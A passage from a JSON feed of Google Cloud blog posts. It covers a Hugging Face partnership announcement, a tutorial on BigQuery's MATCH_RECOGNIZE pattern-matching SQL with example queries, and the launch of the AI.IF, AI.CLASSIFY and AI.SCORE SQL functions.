        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For those building with AI, most are in it to change the world \u2014 not twiddle their thumbs.</span><span style=\"vertical-align: baseline;\"> So when inspiration strikes, the last thing anyone wants is to spend hours waiting for the latest AI models to download to their development environment.</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">That\u2019s why today we\u2019re announcing a deeper partnership between </span><a href=\"https://huggingface.co/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hugging Face</span></a><span style=\"vertical-align: baseline;\"> and Google Cloud that:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">reduces Hugging Face model download times through Vertex AI and Google Kubernetes Engine</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">offers native support for TPUs on all open models sourced through Hugging Face</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">provides a safer experience through Google Cloud\u2019s built-in security capabilities.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We\u2019ll enable faster download times through a new gateway for Hugging Face repositories that will cache Hugging Face models and datasets directly on Google Cloud. Moving forward, developers working with Hugging Face\u2019s open models on Google Cloud should expect download times to take minutes, not hours.</span></p>\n<p><span style=\"vertical-align: baseline;\">We\u2019re also working with Hugging Face to add native support for </span><a href=\"https://cloud.google.com/tpu?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TPUs</span></a><span style=\"vertical-align: baseline;\"> for all open models on the Hugging Face platform. This means that whether developers choose to deploy training and inference workloads on </span><a href=\"https://cloud.google.com/gpu?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NVIDIA GPUs</span></a><span style=\"vertical-align: baseline;\"> or on TPUs, they\u2019ll experience the same ease of deployment and support.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Open models are gaining traction with enterprise developers, who typically work with specific security requirements. To support enterprise developers, we\u2019re working with Hugging Face to bring Google Cloud\u2019s extensive security protocols to all Hugging Face models deployed through Vertex AI. This means that any Hugging Face model on </span><a href=\"https://cloud.google.com/model-garden?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Model Garden</span></a><span style=\"vertical-align: baseline;\"> will now be scanned and validated with Google Cloud\u2019s leading cybersecurity capabilities powered by our </span><a href=\"https://cloud.google.com/security/products/threat-intelligence?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Threat Intelligence platform</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.mandiant.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">A more open AI</span></h3>\n<p><span style=\"vertical-align: baseline;\">Ultimately, we\u2019re committed \u2014 through our </span><a href=\"https://cloud.google.com/blog/topics/partners/best-agentic-ecosystem-helping-partners-build-ai-agents-next25\"><span style=\"text-decoration: underline; vertical-align: baseline;\">robust and diverse AI ecosystem</span></a><span style=\"vertical-align: baseline;\"> \u2014 to supporting developers with class-leading AI tools, a choice of </span><a href=\"https://cloud.google.com/ai-infrastructure?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-optimized infrastructur</span></a><span style=\"vertical-align: baseline;\">e, and a selection of </span><a href=\"https://cloud.google.com/model-garden?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">models in the hundreds</span></a><span style=\"vertical-align: baseline;\">; this includes a broad set of </span><a href=\"https://cloud.google.com/use-cases/open-source-ai?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">open models</span></a><span style=\"vertical-align: baseline;\"> optimized to run Google Cloud through Hugging Face.</span></p>\n<p><span style=\"vertical-align: baseline;\">This expanded partnership with Hugging Face furthers that commitment and will ensure that developers have an optimal experience when serving AI models on Google Cloud, whether they choose a model from Google, from our many partners, or one of the thousands of open models available on Hugging Face.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can read more on </span><a href=\"https://huggingface.co/blog/google-cloud\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hugging Face\u2019s blog</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/introducing-match_recognize-in-bigquery/",
        "title": "Do you detect a pattern? BigQuery\u2019s new MATCH_RECOGNIZE function can!",
        "thumbnail": null,
        "author": "Sarah Kwon",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Identifying patterns and sequences within your data is crucial for gaining deeper insights. Whether you're tracking user behavior, analyzing financial transactions, or monitoring sensor data, the ability to recognize specific sequences of events can unlock a wealth of information and actionable insights.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Imagine you\u2019re a marketer at an e-commerce company trying to identify your most valuable customers by their purchasing trajectory. You know that customers who start with small orders and progress to mid-range purchases will usually end up becoming high-value purchasers and your most loyal segment. Having to figure out the complex SQL to aggregate and join this data could be quite the challenging task.</span></p>\n<p><span style=\"vertical-align: baseline;\">That's why we're excited to introduce </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_clause\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MATCH_RECOGNIZE</span></a><span style=\"vertical-align: baseline;\">, a new feature in BigQuery that allows you to perform complex pattern matching on your data directly within your SQL queries!</span></p>\n<h3><strong style=\"vertical-align: baseline;\">What is MATCH_RECOGNIZE?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At its core, MATCH_RECOGNIZE is a tool built directly into GoogleSQL for identifying sequences of rows that match a specified pattern. It\u2019s similar to using regular expressions, but instead of matching patterns in a string of text, you're matching patterns in a sequence of rows within your tables. This capability is especially powerful for analyzing time-series data or any dataset where the order of rows is important.</span></p>\n<p><span style=\"vertical-align: baseline;\">With MATCH_RECOGNIZE, you can express complex patterns and define custom logic to analyze them, all within a single SQL clause. This reduces the need for cumbersome self-joins or complex procedural logic. It also lessens your reliance on Python to process data and will look familiar to users who have experience with Teradata\u2019s nPath or other external MATCH_RECOGNIZE workloads (like Snowflake, Azure, Flink, etc.).</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How it works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The MATCH_RECOGNIZE clause is highly structured and consists of several key components that work together to define your pattern-matching logic:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_partition_by\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">PARTITION BY</strong></a><span style=\"vertical-align: baseline;\">: This clause divides your data into independent partitions, allowing you to perform pattern matching within each partition separately.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_order_by\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ORDER BY</strong></a><span style=\"vertical-align: baseline;\">: Within each partition, ORDER BY sorts the rows to establish the sequence in which the pattern will be evaluated.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_measures\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MEASURES</strong></a><span style=\"vertical-align: baseline;\">: Here, you can define the columns that will be included in the output, often using aggregate functions to summarize the matched data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_pattern\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">PATTERN</strong></a><span style=\"vertical-align: baseline;\">: This is the heart of the MATCH_RECOGNIZE clause, where you define the sequence of symbols that constitutes a match. You can use quantifiers like *, +, ?, and more to specify the number of occurrences for each symbol.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_define\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">DEFINE</strong></a><span style=\"vertical-align: baseline;\">: In this clause, you define the conditions that a row must meet to be classified as a particular symbol in your pattern.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Let's look at a simple example. From our fictional scenario above, imagine you have a table of sales data, and as a marketing analyst, you want to identify </span><span style=\"vertical-align: baseline;\">customer purchase patterns where their spending starts low, increases to a mid-range, and then reaches a high level. </span><span style=\"vertical-align: baseline;\">With MATCH_RECOGNIZE, you could write a query like this:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT *\\r\\nFROM\\r\\n  Example_Project.Example_Dataset.Sales\\r\\nMATCH_RECOGNIZE (\\r\\n  PARTITION BY customer\\r\\n  ORDER BY sale_date\\r\\n  MEASURES\\r\\n     MATCH_NUMBER() AS match_number,\\r\\n     ARRAY_AGG(STRUCT(MATCH_ROW_NUMBER() AS row, CLASSIFIER() AS symbol,   \\r\\n                      product_category)) AS sales\\r\\n  PATTERN (low+ mid+ high+)\\r\\n  DEFINE\\r\\n     low AS amount &lt; 50,\\r\\n     mid AS amount BETWEEN 50 AND 100,\\r\\n     high AS amount &gt; 100\\r\\n);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1716610&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In this example, we're partitioning the data by customer and ordering it by sale_date. The PATTERN clause specifies that we're looking for one or more \u201clow\u201d sales events, followed by one or more \u201cmid\u201d sales events, followed by one or more \u201chigh\u201d sales events. The DEFINE clause then specifies the conditions for a sale to be considered \"low\", \u201cmid\u201d, or \"high\". The MEASURES clause decides how to summarize each match; here with </span><code style=\"vertical-align: baseline;\">match_number</code><span style=\"vertical-align: baseline;\"> we are indexing each match starting from 1 and creating a \u2018sales\u2019 array that will track every match in order.</span></p>\n<p><span style=\"vertical-align: baseline;\">Below are example matched customers:\u00a0</span></p>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 99.7389%;\"><colgroup><col style=\"width: 14.8248%;\" /><col style=\"width: 21.159%;\" /><col style=\"width: 14.9596%;\" /><col style=\"width: 18.7332%;\" /><col style=\"width: 30.3235%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">customer</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">match_number</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.row</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.symbol</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.product_category</strong></p>\n</td>\n</tr>\n<tr>\n<td rowspan=\"5\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Cust1</code></p>\n</td>\n<td rowspan=\"5\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Books</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">mid</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">4</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Electronics</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">5</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Electronics</code></p>\n</td>\n</tr>\n<tr>\n<td rowspan=\"3\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Cust2</code></p>\n</td>\n<td rowspan=\"3\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Software</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">mid</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Books</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>\u00a0</p>\n<p><span style=\"vertical-align: baseline;\">This data highlights some sales trends and could offer insights for a market analyst to strategize conversion of lower-spending customers to higher-value sales based on these trends.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Use cases for MATCH_RECOGNIZE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The possibilities with MATCH_RECOGNIZE are vast. Here are just a few examples of how you can use this powerful feature:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Funnel analysis</strong><span style=\"vertical-align: baseline;\">: Track user journeys on your website or app to identify common paths and drop-off points. For example, you could define a pattern for a successful conversion funnel (e.g., view_product -&gt; add_to_cart -&gt; purchase) and analyze how many users complete it.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fraud detection</strong><span style=\"vertical-align: baseline;\">: Identify suspicious patterns of transactions that might indicate fraudulent activity. For example, you could look for a pattern of multiple small transactions followed by a large one from a new account.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Financial analysis</strong><span style=\"vertical-align: baseline;\">: Analyze stock market data to identify trends and patterns, such as a \"W\" or \"V\" shaped recovery.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Log analysis</strong><span style=\"vertical-align: baseline;\">: Sift through application logs to find specific sequences of events that might indicate an error or a security threat.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Churn analysis</strong><span style=\"vertical-align: baseline;\">: Identify patterns in your data that lead to customer churn and find actionable insights to reduce churn and improve customer sentiment.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Network monitoring</strong><span style=\"vertical-align: baseline;\">: Identify a series of failed login attempts to track issues or potential threats.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Supply chain monitoring</strong><span style=\"vertical-align: baseline;\">: Flag delays in a sequence of shipment events.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Sports analytics</strong><span style=\"vertical-align: baseline;\">: Identify streaks or changes in output for different players / teams over games, such as winning or losing streaks, changes in starting lineups, etc.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to start using MATCH_RECOGNIZE in your own queries? The feature is now available to all BigQuery users! To learn more and dive deeper into the syntax and advanced capabilities, check out the official </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_clause\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://github.com/GoogleCloudPlatform/bigquery-utils/blob/master/notebooks/bigquery_match_recognize_demo.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tutorial</span></a><span style=\"vertical-align: baseline;\"> available on Colab, BigQuery, and GitHub.</span></p>\n<p><span style=\"vertical-align: baseline;\">MATCH_RECOGNIZE opens up a whole new world of possibilities for sequential analysis in BigQuery, and we can't wait to see how you'll use it to unlock deeper insights from your data.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/sql-reimagined-for-the-ai-era-with-bigquery-ai-functions/",
        "title": "Announcing BigQuery-managed AI functions for better SQL",
        "thumbnail": null,
        "author": "Vaibhav Sethi",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For decades, SQL has been the universal language for data analysis, offering access to analytics on structured data. Large Language Models (LLMs) like Gemini now provide a path to get nuanced insights from unstructured data such as text, image and video. However, integrating LLMs into standard SQL flow requires data movement, at least some prompt and parameter tuning to optimize result quality. This is expensive to perform at scale, which keeps these capabilities out of reach for many data practitioners. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Today, we are excited to announce the public preview of BigQuery-managed AI functions, a new set of capabilities that reimagine SQL for the AI era</strong><span style=\"vertical-align: baseline;\">. These functions \u2014 AI.IF, AI.CLASSIFY, and AI.SCORE \u2014 allow you to use generative AI for common analytical tasks directly within your SQL queries, no complex prompt tuning or new tools required. These functions have been optimized for their target use cases, and do not need you to choose models or tune their parameters. Further through intelligent optimizations on your provided prompt and query plans we keep the costs minimal.</span></p>\n<p><span style=\"vertical-align: baseline;\">With these new functions, you can perform sophisticated AI-driven analysis using familiar SQL operators:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Filter and join data based on semantic meaning using AI.IF in a WHERE or ON clause.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Categorize unstructured text or images using AI.CLASSIFY in a GROUP BY clause.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Rank rows based on natural language criteria using AI.SCORE in an ORDER BY clause.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_hzHgTuY.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Together, these functions allow answering new kinds of questions previously out of reach for SQL analytics, for example, companies to news articles which mention them even when an old or unofficial name is used.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's dive deeper into how each of these functions works.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Function deep dive</strong></h2>\n<h3><strong style=\"vertical-align: baseline;\">AI.IF: Semantic filtering and joining</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-if\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.IF</span></a><span style=\"vertical-align: baseline;\">, you can filter or join data using conditions written in natural language. This is useful for tasks like identifying negative customer reviews, filtering images that have specific attributes, or finding relevant information in documents. BigQuery optimizes the query plan to reduce the number of calls to LLM by evaluating non-AI filters first. For example, the following query finds tech news articles from BBC that are related to Google.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT title, body \\r\\nFROM bigquery-public-data.bbc_news.fulltext \\r\\nWHERE AI.IF((&quot;The news is related to Google, news: &quot;, body),   \\r\\n      \\t     connection_id =&gt; &quot;us.test_connection&quot;)\\r\\n      AND category = &quot;tech&quot; \\t-- Non-AI filter evaluated first&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732940&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">You can also use </span><span style=\"vertical-align: baseline;\">AI.IF()</span><span style=\"vertical-align: baseline;\"> for powerful semantic joins, such as performing entity resolution</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">between two different product catalogs. The following query finds products that are semantically identical, even if their names are not an exact match.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;WITH product_catalog_A AS (SELECT &quot;Veridia AquaSource Hydrating Shampoo&quot; as product\\r\\n UNION ALL SELECT &quot;Veridia Full-Lift Volumizing Shampoo&quot;),\\r\\n     product_catalog_B AS (SELECT &quot;Veridia Shampoo, AquaSource Hydration&quot; as product)\\r\\nSELECT *\\r\\nFROM product_catalog_A a JOIN product_catalog_B b\\r\\nON AI.IF((a.product, &quot; is the same product as &quot;, b.product),\\r\\n  connection_id =&gt; &quot;us.test_connection&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732e50&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">AI.CLASSIFY: Data classification</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-classify\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.CLASSIFY</span></a><span style=\"vertical-align: baseline;\"> function lets you categorize text or image based on labels you provide. You can use it to route support tickets by topic or classify images based on their style. For instance, you can classify news articles by topic and then count the number of articles in each category with a single query.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;SELECT\\r\\n  AI.CLASSIFY(\\r\\n    body, \\r\\n    categories =&gt; [&#x27;tech&#x27;, &#x27;sport&#x27;, &#x27;business&#x27;, &#x27;politics&#x27;, &#x27;entertainment&#x27;],\\r\\n    connection_id =&gt; &#x27;us.test_connection&#x27;) AS category,\\r\\n  COUNT(*) num_articles\\r\\nFROM bigquery-public-data.bbc_news.fulltext\\r\\nGROUP BY category;&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732b80&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">AI.SCORE: Semantic ranking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can use </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-score\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.SCORE</span></a><span style=\"vertical-align: baseline;\"> to rank rows based on natural language criteria. This is powerful for ranking items based on a rubric. To give you consistent and high-quality results, BigQuery automatically refines your prompt into a structured scoring rubric. This example finds the top 10 most positive reviews for a movie of your choosing.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT\\r\\n  review,\\r\\n  AI.SCORE((&quot;From 1 to 10, rate how much does the reviewer like the movie :&quot;, review),\\r\\n           connection_id =&gt; \\&#x27;us.test_connection\\&#x27;) AS ai_rating,\\r\\n  reviewer_rating AS human_rating,\\r\\nFROM bigquery-public-data.imdb.reviews\\r\\nWHERE title = \\&#x27;Movie\\&#x27;\\r\\nORDER BY ai_rating DESC\\r\\nLIMIT 10;&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732eb0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Built-in optimizations</span></h2>\n<p><span style=\"vertical-align: baseline;\">These functions allow you to easily mix AI processing with common SQL operators like </span><span style=\"vertical-align: baseline;\">WHERE, JOIN, ORDER BY</span><span style=\"vertical-align: baseline;\">, and </span><span style=\"vertical-align: baseline;\">GROUP BY</span><span style=\"vertical-align: baseline;\">. BigQuery handles prompt optimization, model selection, and model parameter tuning for you.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prompt optimization:</strong><span style=\"vertical-align: baseline;\"> LLMs are sensitive to the wording of a prompt, the same question can be expressed in different ways which affect quality and consistency. BigQuery optimizes your prompts into a structured format specifically for Gemini, helping to ensure higher-quality results and an improved cache hit rate.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Query plan optimization:</strong><span style=\"vertical-align: baseline;\"> Running generative AI models over millions of rows can be slow and expensive. BigQuery query planner reorders AI functions in your filters and pulls AI functions out from join to reduce the number of calls to the model, which saves costs and improves performance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Model endpoint and parameter tuning: </strong><span style=\"vertical-align: baseline;\">BigQuery tunes model endpoint and model parameters to improve both result quality and results consistency across query runs.</span></p>\n</li>\n</ul>\n<h2><strong style=\"vertical-align: baseline;\">Get started</strong></h2>\n<p><span style=\"vertical-align: baseline;\">The new managed AI functions \u2014 AI.IF() , AI.SCORE() and AI.CLASSIFY() \u2014 complement the existing general-purpose Gemini inference functions such as AI.GENERATE from BigQuery.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">What to use and when: </strong><span style=\"vertical-align: baseline;\">When your use case fits them, start with the managed AI functions as they are optimized for cost and quality. Use the AI.GENERATE family of functions when you need control on your prompt and input parameters, and want to choose from a wide range of supported models for LLM inference.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The next big leap</strong><span style=\"vertical-align: baseline;\">: We are optimizing these functions further and moving more of their processing to BigQuery, generating up to 100x performance improvements. This is a first in the industry innovation. Sign up for a private preview </span><a href=\"https://docs.google.com/forms/d/e/1FAIpQLScm4l7CjZ03WsYlzOEpHCqJMFGm6OGyLyEEjeiNuS_Auhw7ig/viewform?usp=header\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: 